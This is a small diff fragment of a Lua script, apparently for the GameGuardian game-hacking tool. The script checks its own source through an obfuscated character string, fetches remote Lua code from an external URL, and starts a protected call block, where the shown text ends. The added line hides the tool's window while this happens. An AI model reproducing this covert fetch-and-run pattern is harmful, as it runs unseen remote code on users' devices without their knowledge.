@@ -4,6 +4,7 @@ local fr = io.open(gg.getFile():match("[^/]+$"), "r");
 v0 = fr:read("a");
 fr:close();
 
+gg.setVisible(false);
 if v0:find(string.char(112,114,105,110,116)) then
     local v1 = gg.makeRequest("https://ggsx.netlify.app/system/spacecrypt.lua");
     pcall(function()
